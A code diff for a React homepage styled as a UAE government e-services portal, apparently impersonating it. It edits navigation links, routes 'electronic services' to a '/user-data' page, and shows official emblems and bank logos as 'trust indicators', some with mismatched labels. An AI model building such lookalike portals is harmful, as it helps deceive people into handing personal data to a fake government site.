@@ -15,7 +15,7 @@ export default function Home() {
           <div className="flex gap-4">
             <a href="#" className="hover:text-amber-600">English</a>
             <span className="text-gray-300">|</span>
-            <a href="#" className="hover:text-amber-600">تسجيل الدخول</a>
+            <a href="/" className="hover:text-amber-600">تسجيل الدخول</a>
           </div>
         </div>
       </div>
@@ -30,10 +30,10 @@ export default function Home() {
             </div>
           </div>
           <nav className="hidden lg:flex gap-8 text-sm font-bold text-gray-700">
-            <a href="#" className="hover:text-amber-500 transition-colors">الرئيسية</a>
-            <a href="#" className="hover:text-amber-500 transition-colors">الخدمات الإلكترونية</a>
-            <a href="#" className="hover:text-amber-500 transition-colors">عن البوابة</a>
-            <a href="#" className="hover:text-amber-500 transition-colors">مركز المساعدة</a>
+            <a href="/" className="hover:text-amber-500 transition-colors">الرئيسية</a>
+            <a href="/user-data" onClick={(e) => { e.preventDefault(); setLocation("/user-data"); }} className="hover:text-amber-500 transition-colors">الخدمات الإلكترونية</a>
+            <a href="/" className="hover:text-amber-500 transition-colors">عن البوابة</a>
+            <a href="/" className="hover:text-amber-500 transition-colors">مركز المساعدة</a>
           </nav>
           <div className="flex items-center gap-2">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE Emblem" className="h-12 w-auto" />
@@ -72,7 +72,7 @@ export default function Home() {
                 >
                   ابدأ الخدمة الآن
                 </a>
-                <a href="#" className="bg-white/10 border border-white/20 text-white hover:bg-white/20 py-4 px-8 rounded-lg font-bold inline-block">
+                <a href="/" className="bg-white/10 border border-white/20 text-white hover:bg-white/20 py-4 px-8 rounded-lg font-bold inline-block">
                   دليل المستخدم
                 </a>
               </div>
@@ -111,10 +111,10 @@ export default function Home() {
         {/* Trust Indicators */}
         <section className="py-12 bg-gray-50 border-b border-gray-200">
           <div className="container flex flex-wrap justify-center items-center gap-8 md:gap-20 opacity-60 grayscale hover:grayscale-0 transition-all">
-             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="Gov" className="h-12" />
-             <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/0/04/Central_Bank_of_the_United_Arab_Emirates_Logo.svg/1200px-Central_Bank_of_the_United_Arab_Emirates_Logo.svg.png" alt="Central Bank" className="h-12" />
-             <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/a/a3/TRA_UAE_Logo.svg/1200px-TRA_UAE_Logo.svg.png" alt="TDRA" className="h-10" />
-             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UAE_Pass_Logo.svg/1200px-UAE_Pass_Logo.svg.png" alt="UAE Pass" className="h-8" />
+             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE Government" className="h-12 w-auto" />
+             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/First_Abu_Dhabi_Bank_Logo.svg/1200px-First_Abu_Dhabi_Bank_Logo.svg.png" alt="Central Bank" className="h-12 w-auto" />
+             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/First_Abu_Dhabi_Bank_Logo.svg/1200px-First_Abu_Dhabi_Bank_Logo.svg.png" alt="TDRA" className="h-10 w-auto" />
+             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UAE_Pass_Logo.svg/1200px-UAE_Pass_Logo.svg.png" alt="UAE Pass" className="h-8 w-auto" />
           </div>
         </section>
       </main>
